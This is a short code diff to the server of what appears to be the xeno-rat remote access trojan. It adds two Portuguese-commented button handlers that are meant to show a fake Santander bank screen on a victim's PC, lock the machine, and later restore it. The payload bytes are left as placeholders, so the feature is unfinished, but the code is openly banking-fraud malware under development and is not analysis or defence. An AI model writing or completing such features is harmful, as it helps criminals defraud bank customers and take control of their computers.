@@ -39,6 +39,20 @@ namespace xeno_rat_server.Forms
             await RefreshMons();
             await RecvThread();
         }
+
+        private void buttonFreezeSantander_Click(object sender, EventArgs e)
+        {
+            // Implementar a funcionalidade de travamento
+            // Exibir uma tela falsa do banco e bloquear o PC da vítima
+            client.SendAsync(new byte[] { /* código para travar */ });
+        }
+
+        private void buttonUnfreezeSantander_Click(object sender, EventArgs e)
+        {
+            // Implementar a funcionalidade de destravamento
+            // Restaurar o PC da vítima ao normal
+            client.SendAsync(new byte[] { /* código para destravar */ });
+        }
         public void TempOnDisconnect(Node node)
         {
             if (node == client || (node == ImageNode && ImageNode != null))
